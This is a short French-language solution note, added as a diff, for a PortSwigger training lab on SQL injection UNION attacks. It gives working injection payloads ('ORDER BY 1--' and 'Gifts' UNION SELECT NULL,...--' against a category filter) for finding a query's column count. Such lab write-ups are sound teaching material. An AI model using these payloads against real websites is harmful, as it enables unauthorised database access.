@@ -1,0 +1,23 @@
+#SQL injection UNION attack, determining the number of columns returned by the query
+
+#Ce laboratoire contient une vulnérabilité d'injection SQL dans le filtre de la catégorie de produit. Les résultats de la requête sont renvoyés dans la réponse de l'application, vous pouvez donc utiliser une attaque UNION pour récupérer des données à partir d'autres tables. La première étape d'une telle attaque consiste à déterminer le nombre de colonnes renvoyées par la requête. Vous utiliserez ensuite cette technique dans les laboratoires suivants pour construire l'attaque complète.
+
+Pour résoudre le laboratoire, déterminer le nombre de colonnes renvoyées par la requête en effectuant une attaque UNION d'injection SQL qui retourne une ligne supplémentaire contenant des valeurs nulles.
+
+
+#https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-determining-the-number-of-columns-required/sql-injection/union-attacks/lab-determine-number-of-columns#
+
+
+
+#Correction :
+
+
+Oder by 1-- | UNION SELECT NULL,NULL,NULL--
+
+
+filter?category=Gifts' UNION SELECT NULL--
+
+filter?category=Gifts' UNION SELECT NULL,NULL--
+
+filter?category=Gifts' UNION SELECT NULL,NULL,NULL--
+
